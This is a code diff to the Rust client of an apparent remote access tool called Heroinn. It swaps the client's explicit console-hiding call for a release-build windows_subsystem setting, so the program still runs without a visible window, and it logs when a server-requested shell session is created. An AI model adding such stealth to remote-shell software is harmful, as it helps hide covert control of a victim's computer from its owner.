@@ -1,5 +1,4 @@
-// if set windows process subsystem as window , conpty will cant work.
-//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 use std::{sync::{mpsc::channel, Arc, atomic::AtomicU64, Mutex}, time::Duration, str::FromStr};
 use std::sync::atomic::Ordering::Relaxed;
 use uuid::Uuid;
@@ -23,12 +22,6 @@ lazy_static!{
     static ref G_DNA : SlaveDNA = G_CONNECTION_INFO;
 }
 
-#[cfg(target_os = "windows")]
-fn hide_console_window(){
-    use windows::Win32::{System::Console::GetConsoleWindow, UI::WindowsAndMessaging::ShowWindow};
-    unsafe { ShowWindow(GetConsoleWindow(), windows::Win32::UI::WindowsAndMessaging::SW_HIDE) };
-}
-
 fn main() {
 
     #[cfg(debug_assertions)]
@@ -40,10 +33,6 @@ fn main() {
             ]
         ).unwrap();
     }
-
-    #[cfg(target_os = "windows")]
-    #[cfg(not(debug_assertions))]
-    hide_console_window();
 
     let clientid = Uuid::new_v4().to_string();
 
@@ -242,6 +231,7 @@ fn main() {
 
                     match HeroinnServerCommandID::from(buf[0]){
                         HeroinnServerCommandID::Shell => {
+                            log::debug!("create shell session");
                             let msg = match Message::new(client.local_addr().unwrap() , HeroinnProtocol::TCP , &buf){
                                 Ok(p) => p,
                                 Err(e) => {
